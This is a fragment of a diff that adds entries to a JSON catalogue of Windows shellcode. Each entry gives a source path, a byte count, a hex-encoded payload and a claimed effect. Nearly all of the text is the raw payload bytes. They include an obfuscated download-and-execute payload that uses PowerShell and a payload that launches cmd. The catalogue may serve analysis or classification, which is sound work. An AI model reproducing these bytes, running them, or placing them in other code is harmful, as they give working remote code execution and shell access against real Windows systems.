+    "bytes_hex": "31c050684141652258c1e808c1e80850b834470b4dbb5d696e3531d850b843321022bb796e514e31d850b860054232bb4978797131d850b80f1c2c14bb6a64493331d850b8073e0b40bb4652626e31d850b8440a7807bb6349425b31d850b80f164b0dbb6a31672d31d850b818625c1fbb614c396731d850b81b2d1e1fbb6b586a6b31d850b845404166bb3d78774931d850b8021f4b45bb6d6b386a31d850b8243e1932bb454e6a5a31d850b8005e3a35bb6c73495b31d850b81f374024bb6d52324131d850b82e356831bb5a4c454131d850b8481e1c15bb676e696131d850b826280d5dbb4f45623331d850b820571d45bb4778633631d850b8046a243bbb77444b4931d850b8180f0a32bb6c6e784731d850b87d183c27bb526c5d5531d850b803446060bb77345a4f31d850b8476b1f20bb6f4c775431d850b82a5e2b20bb6c37474531d850b85907120ebb3568736a31d850b80159112cbb4536664231d850b822224e5abb4c56677431d850b800371b48bb435b722d31d850b84a1f2213bb6448477131d850b86a230318bb4a6d666c31d850b82d54571cbb4731346831d850b84e15365abb3938793831d850b8597f1f04bb7957516131d850b847561d2fbb65703d5431d850b82c180854bb4d766c7431d850b85a34581bbb395b357631d850b83f0f4b41bb53636b6c31d850b84a1e590bbb386d316e31d850b8492b162abb3944614f31d85089e0bb41414101c1eb08c1eb08c1eb085350bb95e6b177ffd3bbcf2aae77ffd3",
+    "claimed_effect": "Obfuscated Shellcode x86-x64 Download And Execute [Use PowerShell]",
+    "supported": true
+  },
+  {
+    "source_file": "Windows-64/Windows_Seven_x64_(cmd).c",
+    "bucket": "hex",
+    "os": "Windows-64",
+    "arch": null,
+    "byte_count": 61,
+    "bytes_hex": "31c9648b71308b760c8b761c8b368b068b6808eb205b53555b81eb1111111181c3da3f1a11ffd381c31111111181eb8ccc1811ffd3e8dbffffff636d64",
+    "claimed_effect": "Windows Seven x64 (cmd)",
+    "supported": true
+  }
+]
